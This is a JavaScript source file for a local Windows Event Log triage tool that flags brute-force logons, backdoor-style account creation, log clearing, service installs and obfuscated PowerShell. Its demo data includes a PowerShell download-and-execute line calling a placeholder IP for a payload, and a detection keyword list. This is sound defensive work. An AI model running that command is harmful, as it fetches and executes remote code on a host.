'use strict';

// ============================================================
// SOC Triage Toolkit — Windows Event Log Triage Tool
// All analysis is performed locally. No data is transmitted.
// ============================================================

let winEvents = [];
let winIsDemo = false;

// --- XSS prevention: always escape user-supplied content ---
function wEsc(str) {
  if (str === null || str === undefined) return '';
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;');
}

// --- CSV Parser (same safe parser as network tool) ---
function winParseCSV(text) {
  const lines = text.replace(/\r\n/g, '\n').replace(/\r/g, '\n').split('\n');
  if (lines.length < 2) return [];
  const headers = winSplitCSVLine(lines[0]).map(h => h.trim().replace(/^"|"$/g, ''));
  const rows = [];
  for (let i = 1; i < lines.length; i++) {
    const line = lines[i].trim();
    if (!line) continue;
    const vals = winSplitCSVLine(line).map(v => v.trim().replace(/^"|"$/g, ''));
    const row = {};
    headers.forEach((h, idx) => { row[h] = vals[idx] || ''; });
    rows.push(row);
  }
  return rows;
}

function winSplitCSVLine(line) {
  const result = [];
  let cur = '', inQuote = false;
  for (let i = 0; i < line.length; i++) {
    const ch = line[i];
    if (ch === '"') {
      if (inQuote && line[i+1] === '"') { cur += '"'; i++; }
      else inQuote = !inQuote;
    } else if (ch === ',' && !inQuote) {
      result.push(cur); cur = '';
    } else { cur += ch; }
  }
  result.push(cur);
  return result;
}

// --- Column mapping for Windows Event CSV ---
function winMapColumns(headers) {
  const map = {};
  const norm = h => h.toLowerCase().replace(/[^a-z0-9]/g, '');
  const candidates = {
    eventId:   ['eventid', 'event id', 'eventidentifier', 'id'],
    level:     ['level', 'levelname', 'severity', 'type'],
    dateTime:  ['datetime', 'date and time', 'datecreated', 'timestamp', 'time', 'date'],
    source:    ['source', 'sourcename', 'provider'],
    task:      ['taskcategory', 'task', 'category', 'taskname'],
    user:      ['user', 'username', 'account', 'accountname', 'subjectusername'],
    computer:  ['computer', 'computername', 'workstation', 'machine'],
    keywords:  ['keywords'],
    message:   ['message', 'description', 'details']
  };
  headers.forEach(h => {
    const n = norm(h);
    Object.keys(candidates).forEach(key => {
      if (!map[key] && candidates[key].some(c => norm(c) === n)) map[key] = h;
    });
  });
  return map;
}

// --- Normalise an event row ---
function winNormaliseEvent(row, colMap) {
  const eid = parseInt((row[colMap.eventId] || '').replace(/[^0-9]/g, ''), 10) || 0;
  const user = (row[colMap.user] || '').trim();
  const acct = extractAccount(user, row[colMap.message] || '');
  return {
    eventId:  eid,
    level:    (row[colMap.level]    || 'Information').trim(),
    dateTime: (row[colMap.dateTime] || '').trim(),
    source:   (row[colMap.source]   || '').trim(),
    task:     (row[colMap.task]     || '').trim(),
    user:     acct,
    computer: (row[colMap.computer] || '').trim(),
    message:  (row[colMap.message]  || '').trim(),
    rawUser:  user
  };
}

function extractAccount(userField, message) {
  if (userField && userField !== 'N/A' && userField !== '-') return userField;
  // Try to extract from message
  const m = message.match(/Account Name:\s*([^\r\n\t]+)/i);
  return m ? m[1].trim() : (userField || 'Unknown');
}

// --- Windows Event ID knowledge base ---
const WIN_EVENT_DB = {
  4624: { name: 'Successful Logon',              defaultSev: 'informational' },
  4625: { name: 'Failed Logon',                  defaultSev: 'low' },
  4720: { name: 'User Account Created',          defaultSev: 'medium' },
  4726: { name: 'User Account Deleted',          defaultSev: 'medium' },
  4728: { name: 'Member Added to Global Group',  defaultSev: 'medium' },
  4732: { name: 'Member Added to Local Group',   defaultSev: 'medium' },
  4688: { name: 'Process Created',               defaultSev: 'informational' },
  4104: { name: 'PowerShell Script Block',        defaultSev: 'low' },
  7045: { name: 'Service Installed',             defaultSev: 'medium' },
  1102: { name: 'Security Audit Log Cleared',    defaultSev: 'high' }
};

// --- Thresholds ---
function getWinThresholds() {
  return {
    fails: parseInt(document.getElementById('win-thr-fails').value, 10) || 5
  };
}

function resetWinThresholds() {
  document.getElementById('win-thr-fails').value = 5;
}

// --- Tab switching ---
function showWinTab(name, btn) {
  document.querySelectorAll('#win-results .tool-section').forEach(s => s.classList.remove('active'));
  document.querySelectorAll('#win-results .section-tab').forEach(b => { b.classList.remove('active'); b.setAttribute('aria-selected','false'); });
  document.getElementById('wtab-' + name).classList.add('active');
  btn.classList.add('active'); btn.setAttribute('aria-selected','true');
}

// --- File upload ---
document.addEventListener('DOMContentLoaded', () => {
  const zone  = document.getElementById('upload-zone');
  const input = document.getElementById('win-file-input');

  zone.addEventListener('dragover', e => { e.preventDefault(); zone.classList.add('drag-over'); });
  zone.addEventListener('dragleave', () => zone.classList.remove('drag-over'));
  zone.addEventListener('drop', e => {
    e.preventDefault(); zone.classList.remove('drag-over');
    const file = e.dataTransfer.files[0];
    if (file) winHandleFile(file);
  });
  zone.addEventListener('keydown', e => { if (e.key === 'Enter' || e.key === ' ') input.click(); });
  input.addEventListener('change', () => { if (input.files[0]) winHandleFile(input.files[0]); });

  ['win-filter-eid','win-filter-acct','win-filter-sev'].forEach(id => {
    document.getElementById(id).addEventListener('input', renderWinAlerts);
    document.getElementById(id).addEventListener('change', renderWinAlerts);
  });
});

function winHandleFile(file) {
  if (!file.name.toLowerCase().endsWith('.csv')) {
    winShowError('Please upload a CSV file. This tool supports Windows Event Viewer CSV exports.');
    return;
  }
  if (file.size > 50 * 1024 * 1024) {
    winShowError('File is too large (max 50 MB). Consider filtering events in Event Viewer before exporting.');
    return;
  }
  const reader = new FileReader();
  reader.onload = e => winProcessCSV(e.target.result, file.name, false);
  reader.onerror = () => winShowError('Could not read the file. Please try again.');
  reader.readAsText(file);
}

function winShowError(msg) {
  const box = document.getElementById('win-parse-error');
  document.getElementById('win-parse-error-text').textContent = msg;
  box.classList.remove('hidden');
}

function winProcessCSV(text, filename, demo) {
  document.getElementById('win-parse-error').classList.add('hidden');
  winIsDemo = demo;

  let rows;
  try { rows = winParseCSV(text); } catch(err) {
    winShowError('Failed to parse CSV: ' + err.message); return;
  }
  if (rows.length === 0) { winShowError('The CSV file appears to be empty.'); return; }

  const headers  = Object.keys(rows[0]);
  const colMap   = winMapColumns(headers);

  const missing = [];
  if (!colMap.eventId)  missing.push('Event ID');
  if (!colMap.dateTime) missing.push('Date and Time');
  if (!colMap.user)     missing.push('User / Account');

  if (!colMap.eventId) {
    winShowError('This CSV does not appear to contain an Event ID column. Please check that you exported a Windows Security Event log in CSV format.');
    return;
  }

  winEvents = rows.map(r => winNormaliseEvent(r, colMap));

  const fi = document.getElementById('win-file-info');
  fi.innerHTML = '<span aria-hidden="true">&#10003;</span> ' + wEsc(filename) + ' &mdash; ' + wEsc(String(winEvents.length)) + ' events loaded' +
    (missing.length ? ' &mdash; Note: some columns not found: ' + missing.map(wEsc).join(', ') : '');
  fi.classList.add('visible');

  const banner = document.getElementById('win-demo-banner');
  winIsDemo ? banner.classList.add('visible') : banner.classList.remove('visible');

  document.getElementById('win-results').classList.remove('hidden');
  winRunAnalysis();
}

// --- Core analysis ---
function winRunAnalysis() {
  const thr    = getWinThresholds();
  const events = winEvents;
  window._winAlerts = [];

  // Group by Event ID
  const byEid = {};
  events.forEach(e => {
    byEid[e.eventId] = (byEid[e.eventId] || 0) + 1;
  });

  // Group by account
  const byAccount = {};
  events.forEach(e => {
    const acct = e.user || 'Unknown';
    if (!byAccount[acct]) byAccount[acct] = { total:0, success:0, failed:0, other:0 };
    byAccount[acct].total++;
    if (e.eventId === 4624) byAccount[acct].success++;
    else if (e.eventId === 4625) byAccount[acct].failed++;
    else byAccount[acct].other++;
  });

  // -------------------------------------------------------
  // CORRELATION RULE 1: Repeated failed logons
  // -------------------------------------------------------
  const failsByAcct = {};
  events.filter(e => e.eventId === 4625).forEach(e => {
    const a = e.user || 'Unknown';
    if (!failsByAcct[a]) failsByAcct[a] = [];
    failsByAcct[a].push(e);
  });

  // -------------------------------------------------------
  // CORRELATION RULE 2: Failed logins followed by success
  // -------------------------------------------------------
  const successByAcct = {};
  events.filter(e => e.eventId === 4624).forEach(e => {
    const a = e.user || 'Unknown';
    successByAcct[a] = true;
  });

  Object.entries(failsByAcct).forEach(([acct, failEvents]) => {
    const count = failEvents.length;
    const hadSuccess = !!successByAcct[acct];

    if (count >= thr.fails) {
      if (hadSuccess) {
        // Rule 2: failures then success — HIGH
        window._winAlerts.push({
          title: 'Possible Password Guessing Followed by Successful Login',
          sev: 'high',
          eventIds: '4625 → 4624',
          account: acct,
          timeRange: timeRange(failEvents),
          srcIp: 'See event details',
          observed: wEsc(String(count)) + ' failed login attempts for account \u2018' + wEsc(acct) + '\u2019 were followed by a successful login (Event ID 4624).',
          why: 'Multiple failed authentication attempts followed by a successful login may indicate that the correct password was eventually guessed. This pattern is associated with brute-force and password-spraying techniques.',
          benign: 'The legitimate user may have forgotten their password and tried several times before succeeding. A service or application may have been using an outdated credential before being updated.',
          steps: [
            'Identify the source IP address of the authentication attempts.',
            'Determine whether the source device belongs to the account holder.',
            'Review what actions were performed after the successful login.',
            'Check whether the same source attempted to authenticate against other accounts.',
            'Review MFA logs or endpoint telemetry if available.',
            'If the source IP is external or unexpected, treat this as a priority finding.'
          ]
        });
      } else {
        // Rule 1: just repeated failures
        window._winAlerts.push({
          title: 'Repeated Failed Logons',
          sev: count >= thr.fails * 3 ? 'high' : 'medium',
          eventIds: '4625',
          account: acct,
          timeRange: timeRange(failEvents),
          srcIp: 'See event details',
          observed: wEsc(String(count)) + ' failed login attempts for account \u2018' + wEsc(acct) + '\u2019. Configured threshold: ' + thr.fails + ' failures.',
          why: 'Repeated authentication failures for the same account may indicate a password guessing attempt, a brute-force attack, or an application using an incorrect or expired credential.',
          benign: 'The legitimate user may have forgotten their password or been typing it incorrectly. A background service may be configured with a stale credential. An automated process may be misconfigured.',
          steps: [
            'Identify the source system generating the failed attempts.',
            'Determine whether the failures come from one source or multiple.',
            'Check whether the account is a service account or a user account.',
            'Review whether the account was eventually locked out.',
            'Look for successful logins for the same account before or after the failures.',
            'Check whether other accounts experienced similar failures from the same source.'
          ]
        });
      }
    }
  });

  // -------------------------------------------------------
  // CORRELATION RULE 3: Account created then privilege added
  // -------------------------------------------------------
  const createdAccounts = {};
  events.filter(e => e.eventId === 4720).forEach(e => {
    createdAccounts[e.user || 'Unknown'] = e;
  });

  const privAddedAccounts = {};
  events.filter(e => e.eventId === 4728 || e.eventId === 4732).forEach(e => {
    const a = e.user || 'Unknown';
    if (!privAddedAccounts[a]) privAddedAccounts[a] = [];
    privAddedAccounts[a].push(e);
  });

  Object.keys(createdAccounts).forEach(acct => {
    if (privAddedAccounts[acct]) {
      const privEvents = privAddedAccounts[acct];
      const eidList = ['4720', ...privEvents.map(e => String(e.eventId))].join(' → ');
      window._winAlerts.push({
        title: 'New Account Granted Privileges',
        sev: 'high',
        eventIds: eidList,
        account: acct,
        timeRange: 'Within this dataset',
        srcIp: 'N/A',
        observed: 'Account \u2018' + wEsc(acct) + '\u2019 was created (Event 4720) and subsequently added to a security group (' + wEsc(privEvents.map(e => e.eventId).join(', ')) + ').',
        why: 'Creating a new account and quickly granting it membership in a security group can be legitimate administrative activity, but it may also indicate an attacker establishing persistence or escalating privileges.',
        benign: 'A system administrator may have created a new staff account and assigned it to the appropriate groups as part of normal onboarding. This may be expected IT department activity.',
        steps: [
          'Confirm whether the account creation was authorised.',
          'Identify the administrator who performed the creation and group assignment.',
          'Determine whether a change ticket or onboarding request exists for this account.',
          'Review which security groups the account was added to.',
          'Check whether the account is still required or whether it should be removed.',
          'Review any subsequent activity performed by the new account.'
        ]
      });
    }
  });

  // -------------------------------------------------------
  // RULE 4: Security log cleared (1102)
  // -------------------------------------------------------
  const logClearEvents = events.filter(e => e.eventId === 1102);
  if (logClearEvents.length > 0) {
    window._winAlerts.push({
      title: 'Security Audit Log Cleared',
      sev: 'high',
      eventIds: '1102',
      account: logClearEvents[0].user || 'Unknown',
      timeRange: timeRange(logClearEvents),
      srcIp: 'N/A',
      observed: 'The Windows Security audit log was cleared ' + wEsc(String(logClearEvents.length)) + ' time(s) within this dataset.',
      why: 'Clearing the Security event log removes evidence of previous activity. While this can occur during legitimate maintenance, attackers sometimes clear logs to remove traces of their actions. This event should normally be investigated regardless of other context.',
      benign: 'A system administrator may have cleared the log during planned maintenance, a system rebuild, or as part of a log management process. Some automated tools clear logs as part of their operation.',
      steps: [
        'Identify which account performed the log clearing.',
        'Determine whether the account holder had a legitimate reason to clear the log.',
        'Check whether a change request or maintenance window covers this activity.',
        'Review any other available logs (firewall, application, Sysmon) for activity around the same time.',
        'If no authorised reason can be found, treat this as a priority investigation.',
        'Consider whether endpoint telemetry or a SIEM can provide coverage that predates the log clearing.'
      ]
    });
  }

  // -------------------------------------------------------
  // RULE 5: Standalone privilege group additions (no matching 4720)
  // -------------------------------------------------------
  events.filter(e => e.eventId === 4728 || e.eventId === 4732).forEach(e => {
    const acct = e.user || 'Unknown';
    if (!createdAccounts[acct]) {
      window._winAlerts.push({
        title: 'User Added to Security Group',
        sev: 'medium',
        eventIds: String(e.eventId),
        account: acct,
        timeRange: e.dateTime || 'Unknown',
        srcIp: 'N/A',
        observed: 'Account \u2018' + wEsc(acct) + '\u2019 was added to a security group (Event ID ' + wEsc(String(e.eventId)) + '). Computer: ' + wEsc(e.computer || 'Unknown') + '.',
        why: 'Adding a user to a security group changes their access rights. If the group is privileged (such as Administrators, Remote Desktop Users, or Domain Admins), this warrants verification.',
        benign: 'This may be a routine access management change performed by an authorised administrator.',
        steps: [
          'Identify which security group the account was added to.',
          'Confirm whether an authorised administrator performed this action.',
          'Determine whether the change was covered by a change request or access review.',
          'Assess whether the new group membership is appropriate for the account role.',
          'If the group is highly privileged, consider immediate verification.'
        ]
      });
    }
  });

  // -------------------------------------------------------
  // RULE 6: New account created (standalone, no privilege event)
  // -------------------------------------------------------
  events.filter(e => e.eventId === 4720).forEach(e => {
    const acct = e.user || 'Unknown';
    if (!privAddedAccounts[acct]) {
      window._winAlerts.push({
        title: 'New User Account Created',
        sev: 'medium',
        eventIds: '4720',
        account: acct,
        timeRange: e.dateTime || 'Unknown',
        srcIp: 'N/A',
        observed: 'A new user account \u2018' + wEsc(acct) + '\u2019 was created on computer \u2018' + wEsc(e.computer || 'Unknown') + '\u2019.',
        why: 'New account creation may be legitimate administration, but unauthorised account creation can be used to establish persistence on a compromised system.',
        benign: 'This may be a routine new staff onboarding action performed by an IT administrator.',
        steps: [
          'Confirm whether the account creation was authorised.',
          'Identify who created the account and whether they had the authority to do so.',
          'Check whether the account is still active and whether it is required.',
          'Review activity performed by the new account after creation.',
          'Determine whether the account follows naming conventions.'
        ]
      });
    }
  });

  // -------------------------------------------------------
  // RULE 7: Service installation
  // -------------------------------------------------------
  events.filter(e => e.eventId === 7045).forEach(e => {
    window._winAlerts.push({
      title: 'New Service Installed',
      sev: 'medium',
      eventIds: '7045',
      account: e.user || 'Unknown',
      timeRange: e.dateTime || 'Unknown',
      srcIp: 'N/A',
      observed: 'A new Windows service was installed. Account: ' + wEsc(e.user || 'Unknown') + '. Computer: ' + wEsc(e.computer || 'Unknown') + '.',
      why: 'Service installation can represent legitimate software deployment, but attackers sometimes install malicious services to establish persistence or run code with elevated privileges.',
      benign: 'Legitimate software installers, system administrators, or update mechanisms often install new Windows services.',
      steps: [
        'Identify the service name and the binary path if visible in the event details.',
        'Determine whether the installation was authorised.',
        'Check whether the service name and path correspond to known legitimate software.',
        'Review whether the installation coincides with a planned software deployment.',
        'If the service is unfamiliar, consider checking the file hash against threat intelligence.'
      ]
    });
  });

  // -------------------------------------------------------
  // RULE 8: PowerShell script block logging
  // -------------------------------------------------------
  events.filter(e => e.eventId === 4104).forEach(e => {
    const msg = e.message.toLowerCase();
    const isObfuscated = msg.includes('-enc') || msg.includes('base64') ||
                         msg.includes('iex') || msg.includes('invoke-expression') ||
                         msg.includes('downloadstring') || msg.includes('webclient');
    window._winAlerts.push({
      title: isObfuscated ? 'PowerShell — Potentially Obfuscated Command Detected' : 'PowerShell Script Block Logged',
      sev: isObfuscated ? 'high' : 'informational',
      eventIds: '4104',
      account: e.user || 'Unknown',
      timeRange: e.dateTime || 'Unknown',
      srcIp: 'N/A',
      observed: 'A PowerShell script block was logged on computer \u2018' + wEsc(e.computer || 'Unknown') + '\u2019.' + (isObfuscated ? ' The command may contain obfuscation indicators.' : ''),
      why: isObfuscated
        ? 'Encoded or obfuscated PowerShell commands are sometimes used to bypass security controls or conceal malicious activity. This deserves careful review.'
        : 'PowerShell script block logging provides visibility into commands and scripts executed on the endpoint. Review the script content to assess whether it is expected.',
      benign: 'Many legitimate administrative scripts, software installers, and automation tools use PowerShell, including encoded commands.',
      steps: [
        'Review the full script block content in the original event.',
        'Determine whether the script was expected given the account and computer context.',
        'Check whether encoded content decodes to a recognisable and legitimate command.',
        'Identify the parent process that launched PowerShell if process creation auditing is enabled.',
        'Correlate with other events around the same time.'
      ]
    });
  });

  // -------------------------------------------------------
  // RULE 9: Account deleted
  // -------------------------------------------------------
  events.filter(e => e.eventId === 4726).forEach(e => {
    window._winAlerts.push({
      title: 'User Account Deleted',
      sev: 'low',
      eventIds: '4726',
      account: e.user || 'Unknown',
      timeRange: e.dateTime || 'Unknown',
      srcIp: 'N/A',
      observed: 'User account \u2018' + wEsc(e.user || 'Unknown') + '\u2019 was deleted on \u2018' + wEsc(e.computer || 'Unknown') + '\u2019.',
      why: 'Account deletion may be routine offboarding, but it can also be used to remove traces of a created account used by an attacker.',
      benign: 'Routine leaver process or IT housekeeping performed by an authorised administrator.',
      steps: [
        'Confirm whether the deletion was authorised.',
        'Check whether the deleted account had recent activity.',
        'Determine whether the account matches a known leaver or a recently created suspicious account.',
        'Review who performed the deletion.'
      ]
    });
  });

  // -------------------------------------------------------
  // Render dashboard
  // -------------------------------------------------------
  const total4624 = byEid[4624] || 0;
  const total4625 = byEid[4625] || 0;
  const total4720 = byEid[4720] || 0;
  const total4728 = (byEid[4728] || 0) + (byEid[4732] || 0);
  const total1102 = byEid[1102] || 0;
  const total4688 = byEid[4688] || 0;
  const needsReview = window._winAlerts.filter(a => a.sev === 'high' || a.sev === 'medium').length;

  const sg = document.getElementById('win-stat-grid');
  sg.innerHTML = [
    winStat(winEvents.length, 'Total Events'),
    winStat(total4624, 'Successful Logons'),
    winStat(total4625, 'Failed Logons'),
    winStat(total4720, 'Accounts Created'),
    winStat(total4728, 'Privilege Changes'),
    winStat(total1102, 'Log Cleared Events', total1102 > 0),
    winStat(total4688, 'Process Events'),
    winStat(needsReview, 'Findings to Review', needsReview > 0)
  ].join('');

  // Event ID bar chart
  const eidEntries = Object.entries(byEid).sort((a,b) => b[1]-a[1]).slice(0,10);
  const eidMax = eidEntries[0] ? eidEntries[0][1] : 1;
  const eidBars = document.getElementById('win-eventid-bars');
  eidBars.innerHTML = '';
  eidEntries.forEach(([eid, count]) => {
    const info = WIN_EVENT_DB[parseInt(eid)] || { name: 'Other' };
    const pct  = Math.round((count / eidMax) * 100);
    const item = document.createElement('div');
    item.className = 'bar-item';
    item.innerHTML =
      '<span class="bar-label" title="' + wEsc(eid) + ' — ' + wEsc(info.name) + '">' + wEsc(eid) + ' — ' + wEsc(info.name) + '</span>' +
      '<div class="bar-track" role="presentation"><div class="bar-fill" style="width:' + pct + '%"></div></div>' +
      '<span class="bar-count">' + wEsc(String(count)) + '</span>';
    eidBars.appendChild(item);
  });

  // Admin summary
  const adminEl = document.getElementById('win-admin-summary');
  const adminItems = [];
  if (total4720 > 0) adminItems.push('<li>&#10003; ' + wEsc(String(total4720)) + ' user account(s) created (Event 4720)</li>');
  if (total4728 > 0) adminItems.push('<li>&#10003; ' + wEsc(String(total4728)) + ' security group membership change(s) (Events 4728/4732)</li>');
  if (total1102 > 0) adminItems.push('<li style="color:var(--sev-high);">&#9888; Security audit log cleared ' + wEsc(String(total1102)) + ' time(s) (Event 1102)</li>');
  if (byEid[7045]) adminItems.push('<li>&#10003; ' + wEsc(String(byEid[7045])) + ' service(s) installed (Event 7045)</li>');
  adminEl.innerHTML = adminItems.length
    ? '<ul style="padding-left:1.25rem;font-size:0.9rem;color:var(--text-secondary);">' + adminItems.join('') + '</ul>'
    : '<p>No significant administrative or privilege activity detected in this dataset.</p>';

  // Timeline (up to 20 noteworthy events)
  const notable = events.filter(e => [4625,4624,4720,4726,4728,4732,1102,7045,4104].includes(e.eventId)).slice(0,20);
  const tl = document.getElementById('win-timeline');
  tl.innerHTML = '';
  if (notable.length === 0) {
    tl.innerHTML = '<li><span class="ts-desc">No noteworthy events found in the timeline.</span></li>';
  } else {
    notable.forEach(e => {
      const info = WIN_EVENT_DB[e.eventId] || { name: 'Event' };
      const li = document.createElement('li');
      li.innerHTML =
        '<span class="ts-time">' + wEsc(e.dateTime || 'Unknown time') + '</span>' +
        '<span class="ts-desc"><strong>' + wEsc(String(e.eventId)) + ' — ' + wEsc(info.name) + '</strong>' +
        (e.user ? ' &mdash; Account: ' + wEsc(e.user) : '') +
        (e.computer ? ' &mdash; Host: ' + wEsc(e.computer) : '') + '</span>';
      tl.appendChild(li);
    });
  }
  const tlNote = document.getElementById('win-timeline-note');
  tlNote.textContent = events.length > 20 ? 'Showing ' + notable.length + ' noteworthy events. Full dataset contains ' + winEvents.length + ' events.' : '';

  // Account table
  const acctTbody = document.getElementById('win-acct-tbody');
  acctTbody.innerHTML = '';
  Object.entries(byAccount).sort((a,b) => b[1].total - a[1].total).slice(0,15).forEach(([acct, data], i) => {
    const tr = document.createElement('tr');
    tr.innerHTML = '<td>' + (i+1) + '</td><td>' + wEsc(acct) + '</td><td>' + data.total + '</td><td>' + data.success + '</td><td>' + data.failed + '</td><td>' + data.other + '</td>';
    acctTbody.appendChild(tr);
  });

  // Failed logon table
  const failTbody = document.getElementById('win-fail-tbody');
  failTbody.innerHTML = '';
  Object.entries(failsByAcct).sort((a,b) => b[1].length - a[1].length).forEach(([acct, evts], i) => {
    const tr = document.createElement('tr');
    const hadSuccess = !!successByAcct[acct];
    tr.innerHTML = '<td>' + (i+1) + '</td><td>' + wEsc(acct) + '</td><td>' + evts.length + '</td>' +
      '<td style="color:' + (hadSuccess ? 'var(--sev-high)' : 'var(--green)') + ';">' + (hadSuccess ? 'Yes — investigate' : 'No') + '</td>';
    failTbody.appendChild(tr);
  });

  renderWinAlerts();
}

function reanalyseWindows() {
  if (winEvents.length > 0) winRunAnalysis();
}

// --- Render Windows alert cards ---
function renderWinAlerts() {
  const alerts = window._winAlerts || [];
  const eidFilter  = document.getElementById('win-filter-eid').value.trim();
  const acctFilter = document.getElementById('win-filter-acct').value.toLowerCase().trim();
  const sevFilter  = document.getElementById('win-filter-sev').value.toLowerCase().trim();

  const filtered = alerts.filter(a => {
    if (eidFilter  && !a.eventIds.includes(eidFilter)) return false;
    if (acctFilter && !a.account.toLowerCase().includes(acctFilter)) return false;
    if (sevFilter  && a.sev !== sevFilter) return false;
    return true;
  });

  const container  = document.getElementById('win-alert-list');
  const countEl    = document.getElementById('win-alert-count');
  const noFindings = document.getElementById('win-no-findings');
  container.innerHTML = '';

  countEl.textContent = filtered.length + ' finding' + (filtered.length !== 1 ? 's' : '') +
    (filtered.length < alerts.length ? ' (filtered from ' + alerts.length + ' total)' : '');

  if (filtered.length === 0) { noFindings.classList.remove('hidden'); return; }
  noFindings.classList.add('hidden');

  const sevOrder = { high:0, medium:1, low:2, informational:3 };
  filtered.sort((a,b) => (sevOrder[a.sev]||3) - (sevOrder[b.sev]||3));

  filtered.forEach((a, idx) => {
    const card = document.createElement('article');
    card.className = 'alert-card sev-' + a.sev;
    card.setAttribute('aria-label', a.title + ' — ' + a.sev + ' severity');
    const bodyId = 'win-alert-body-' + idx;
    card.innerHTML =
      '<div class="alert-header" role="button" tabindex="0" aria-expanded="false" aria-controls="' + bodyId + '" onclick="winToggleAlert(this)" onkeydown="if(event.key===\'Enter\'||event.key===\' \')winToggleAlert(this)">' +
        '<span class="sev-badge sev-' + a.sev + '" aria-label="Severity: ' + a.sev + '">' + a.sev + '</span>' +
        '<h3>' + wEsc(a.title) + '</h3>' +
        '<span class="alert-toggle" aria-hidden="true">Click to expand ▼</span>' +
      '</div>' +
      '<div class="alert-body" id="' + bodyId + '">' +
        '<div class="alert-meta">' +
          winMetaItem('Event IDs', a.eventIds) +
          winMetaItem('Account', a.account) +
          winMetaItem('Time / Range', a.timeRange) +
          winMetaItem('Severity', a.sev) +
        '</div>' +
        winAlertSection('Observed Activity', a.observed) +
        winAlertSection('Why This Could Matter', a.why) +
        winAlertSection('Possible Benign Explanation', a.benign) +
        winAlertSectionList('Suggested Investigation Steps', a.steps) +
      '</div>';
    container.appendChild(card);
  });
}

function winToggleAlert(header) {
  const body = header.nextElementSibling;
  const isOpen = body.classList.contains('open');
  body.classList.toggle('open', !isOpen);
  header.setAttribute('aria-expanded', String(!isOpen));
  header.querySelector('.alert-toggle').textContent = isOpen ? 'Click to expand \u25bc' : 'Click to collapse \u25b2';
}

function clearWinFilters() {
  ['win-filter-eid','win-filter-acct','win-filter-sev'].forEach(id => document.getElementById(id).value = '');
  renderWinAlerts();
}

// --- Helpers ---
function winStat(value, label, highlight) {
  return '<div class="stat-card' + (highlight ? ' highlight' : '') + '"><div class="stat-value">' + wEsc(String(value)) + '</div><div class="stat-label">' + wEsc(label) + '</div></div>';
}

function timeRange(events) {
  const times = events.map(e => e.dateTime).filter(Boolean);
  if (!times.length) return 'Unknown';
  if (times.length === 1) return times[0];
  return times[0] + ' to ' + times[times.length - 1];
}

function winMetaItem(label, value) {
  return '<div class="alert-meta-item"><span class="meta-label">' + wEsc(label) + '</span><span class="meta-value">' + wEsc(String(value)) + '</span></div>';
}

function winAlertSection(heading, text) {
  return '<div class="alert-section"><h4>' + wEsc(heading) + '</h4><p>' + wEsc(String(text)) + '</p></div>';
}

function winAlertSectionList(heading, items) {
  return '<div class="alert-section"><h4>' + wEsc(heading) + '</h4><ul>' +
    items.map(i => '<li>' + wEsc(i) + '</li>').join('') + '</ul></div>';
}

// --- Sample data loading ---
function loadWinSample(name) {
  fetch('samples/' + name + '.csv')
    .then(r => { if (!r.ok) throw new Error('not found'); return r.text(); })
    .then(text => winProcessCSV(text, name + '.csv (sample)', true))
    .catch(() => {
      const text = generateWinSampleCSV(name);
      winProcessCSV(text, name + '.csv (built-in sample)', true);
    });
}

function generateWinSampleCSV(name) {
  const header = 'Event ID,Level,Date and Time,Source,Task Category,User,Computer,Message\n';
  const rows = [header];
  let ts = new Date('2024-06-10T08:00:00');

  function addEvent(eid, level, user, computer, message) {
    ts = new Date(ts.getTime() + 60000);
    rows.push([eid, level, ts.toISOString().replace('T',' ').slice(0,19), 'Microsoft-Windows-Security-Auditing', '', user, computer, '"' + message.replace(/"/g,'""') + '"'].join(',') + '\n');
  }

  if (name === 'normal-windows-events') {
    addEvent(4624,'Information','alice','WORKSTATION-01','An account was successfully logged on.');
    addEvent(4624,'Information','bob','WORKSTATION-02','An account was successfully logged on.');
    addEvent(4688,'Information','alice','WORKSTATION-01','A new process has been created. Process: notepad.exe');
    addEvent(4624,'Information','carol','SERVER-01','An account was successfully logged on.');
    addEvent(4688,'Information','bob','WORKSTATION-02','A new process has been created. Process: chrome.exe');
    addEvent(4624,'Information','alice','WORKSTATION-01','An account was successfully logged on.');
    addEvent(4625,'Information','alice','WORKSTATION-01','An account failed to log on.');
    addEvent(4624,'Information','alice','WORKSTATION-01','An account was successfully logged on.');
  } else if (name === 'password-guessing') {
    for (let i = 0; i < 8; i++) addEvent(4625,'Information','jsmith','WORKSTATION-03','An account failed to log on.');
    addEvent(4624,'Information','jsmith','WORKSTATION-03','An account was successfully logged on.');
    addEvent(4688,'Information','jsmith','WORKSTATION-03','A new process has been created. Process: cmd.exe');
  } else if (name === 'account-persistence') {
    addEvent(4624,'Information','sysadmin','SERVER-01','An account was successfully logged on.');
    addEvent(4720,'Information','temp-backdoor','SERVER-01','A user account was created.');
    addEvent(4732,'Information','temp-backdoor','SERVER-01','A member was added to a security-enabled local group. Group: Administrators');
    addEvent(4624,'Information','temp-backdoor','SERVER-01','An account was successfully logged on.');
    addEvent(4688,'Information','temp-backdoor','SERVER-01','A new process has been created. Process: powershell.exe');
  } else {
    // suspicious-admin-activity
    for (let i = 0; i < 6; i++) addEvent(4625,'Information','administrator','DC-01','An account failed to log on.');
    addEvent(4624,'Information','administrator','DC-01','An account was successfully logged on.');
    addEvent(4720,'Information','svc-hidden','DC-01','A user account was created.');
    addEvent(4728,'Information','svc-hidden','DC-01','A member was added to a security-enabled global group. Group: Domain Admins');
    addEvent(4732,'Information','svc-hidden','DC-01','A member was added to a security-enabled local group. Group: Administrators');
    addEvent(4104,'Information','administrator','DC-01','PowerShell script block: Invoke-Expression (New-Object Net.WebClient).DownloadString("http://198.51.100.99/payload")');
    addEvent(7045,'Information','SYSTEM','DC-01','A service was installed. Service Name: WindowsUpdate32');
    addEvent(1102,'Information','administrator','DC-01','The audit log was cleared.');
  }

  return rows.join('');
}
